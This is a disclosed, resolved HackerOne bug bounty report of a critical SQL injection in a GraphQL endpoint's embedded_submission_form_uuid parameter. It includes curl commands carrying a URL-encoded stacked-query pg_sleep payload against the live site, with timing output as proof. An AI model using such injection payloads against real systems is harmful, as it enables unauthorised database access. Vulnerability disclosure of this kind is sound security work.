# [C] SQL injection in GraphQL endpoint through embedded_submission_form_uuid parameter

## Summary
Severity: Critical (CVSS 10.0)
Program: HackerOne
Weakness: SQL Injection
Reporter: jobert
State: resolved
Disclosed: 2018-11-30T01:26:39.932Z
Source: https://hackerone.com/reports/435066

## Details
The `embedded_submission_form_uuid` parameter in the `/graphql` endpoint is vulnerable to a SQL injection. Execute the following command to reproduce the behavior:

**Locally**:
```
curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**HackerOne.com**
```
curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
```

**Additional proof**
```
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(5\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 0% cpu 5.726 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(1\)%3B--%27
{}curl -X POST   0.03s user 0.01s system 2% cpu 1.631 total
$ time curl -X POST https://hackerone.com/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(10\)%3B--%27
{}curl -X POST   0.02s user 0.01s system 0% cpu 10.557 total
```

## Impact

The SQL injections seems to be executing in the context of the `secure` schema, so impact is currently unknown. However, since an attacker may be able to switch schemas, we should consider this to have a high impact on confidentiality.
